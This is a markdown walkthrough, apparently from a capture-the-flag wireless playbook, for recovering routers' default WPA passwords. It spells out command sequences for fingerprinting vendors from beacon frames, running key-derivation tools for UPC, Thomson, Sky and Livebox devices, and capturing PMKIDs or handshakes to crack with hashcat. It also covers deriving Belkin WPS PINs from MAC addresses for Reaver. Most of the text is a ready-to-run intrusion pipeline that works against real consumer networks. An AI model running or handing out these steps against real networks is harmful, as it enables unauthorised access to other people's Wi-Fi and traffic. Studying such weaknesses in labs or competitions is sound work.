# default-psk-derivation — walkthrough

Match the beacon's SSID against a known-vendor regex; run the
vendor's derivation; validate against a captured PMKID or 4-way.

## Path A — Identify the vendor from a beacon

```
# Scan and dump beacons.
airodump-ng --band abg -w /tmp/scan wlan1mon

# List distinct SSIDs.
tshark -r /tmp/scan-01.cap -Y "wlan.fc.type_subtype == 8" \
       -T fields -e wlan.bssid -e wlan.ssid | sort -u
```

Test each SSID against the regex table (`reference.md`). Also read
the WPS IE Manufacturer:

```
tshark -r /tmp/scan-01.cap \
  -Y "wlan.tag.number == 221 && wlan.tag.oui == 0x0050f2" \
  -V | grep -A2 "Manufacturer"
```

## Path B — Run the derivation

Per vendor. Below are the three most common at DEF CON.

### B.1 — UPC/UBEE

```
git clone https://github.com/blasty/upc_keys
cd upc_keys
gcc -O2 -o upc_keys upc_keys.c -lcrypto

# Enumerate candidates from an SSID suffix.
./upc_keys UPC1234567 > /tmp/upc-candidates.txt
wc -l /tmp/upc-candidates.txt      # ~8 candidates
```

### B.2 — Thomson SpeedTouch

```
git clone https://github.com/bettercap/stkeys
cd stkeys && make

# The SSID hex suffix is 6 chars of the serial; the derivation
# enumerates the 3 missing chars.
./stkeys SSID_HEX_SUFFIX > /tmp/stk-candidates.txt
```

### B.3 — Sky Broadband SR

```
git clone https://github.com/mrmagik/sky-router-keygen
python3 sky-keygen.py --bssid AA:BB:CC:DD:EE:FF
# Prints one candidate PSK.
```

### B.4 — Livebox / Sagemcom

```
git clone https://github.com/tetiana-net/livebox-pwn
./livebox-pwn --ssid Livebox-A1B2 > /tmp/livebox-candidates.txt
```

Other vendors: consult the record in `default_psks.json`; each entry's
`technical_body.derivation_tool` names the canonical repo.

## Path C — Validate against a PMKID

Fastest. Capture a PMKID (`pmkid/walkthrough.md`), then trial-crack
against the candidate list.

```
# 1. Capture PMKID.
hcxdumptool -i wlan1mon --enable_status=1 -o /tmp/pmkid.pcapng \
            --filterlist_ap=/root/target.bssidlist --filtermode=2
hcxpcapngtool -o /tmp/hs.22000 /tmp/pmkid.pcapng

# 2. Trial-crack against the vendor's candidate list.
hashcat -m 22000 /tmp/hs.22000 /tmp/upc-candidates.txt -w 4 --status
```

## Path D — Validate against a 4-way handshake

Same idea, alternate input if PMKID doesn't leak.

```
# Capture (see 4-way-handshake/walkthrough.md), then:
hashcat -m 22000 /tmp/hs.22000 /tmp/vendor-candidates.txt
```

## Path E — Full pipeline (no radio at all when the beacon is enough)

Some vendors' derivations produce a *single* candidate. In that case
the flag surface is:

- Match SSID regex → derive → the PSK is the flag *or* is enough to
  decrypt a data-frame capture the puzzle already gave you.
- No PMKID capture, no deauth, no association attempt.

## Path F — Belkin / MAC-derived WPS PIN

Belkin's default PSK isn't deterministic, but the WPS PIN is. Chain:

```
# Derive the WPS PIN from the MAC.
python3 belkin-pin.py AA:BB:CC:DD:EE:FF

# Feed to Reaver.
reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -p <derived-PIN>
```

Reaver reads WPS state, submits the PIN, and (if the AP accepts) M7
returns the WPA PSK.

## Failure modes

- **SSID regex matches but derivation produces no valid PSK.** The
  device was reconfigured — someone changed the SSID or PSK from
  defaults. Fall back to PMKID capture + cracking-tradecraft.
- **Vendor derivation tool is stale.** Some old repos moved / were
  DMCA'd. Record citations in `default_psks.json` pin the URL even
  when repos churn.
- **WPS is locked** and Belkin PIN path won't fire — see
  `wps-locked-bypass-timing`.

## When to reach for this vs. cracking

- **SSID matches a known regex** → derivation first. Zero radio
  time. Even if it fails you spent 30 seconds.
- **SSID doesn't match anything** → straight to
  `cracking-tradecraft/walkthrough.md`.

## Cite

- Every derivation tool has a citation in `default_psks.json`
  (`derivation_tool` field and matching `bibliography.json` entry).
- attacks.json: `default-psk-upc-ubee`,
  `default-psk-thomson-speedtouch`, `default-psk-bt-home-hub`,
  `default-psk-sky-broadband`, `default-psk-livebox-sagemcom`,
  `default-psk-netgear-genie`, `default-psk-technicolor`.
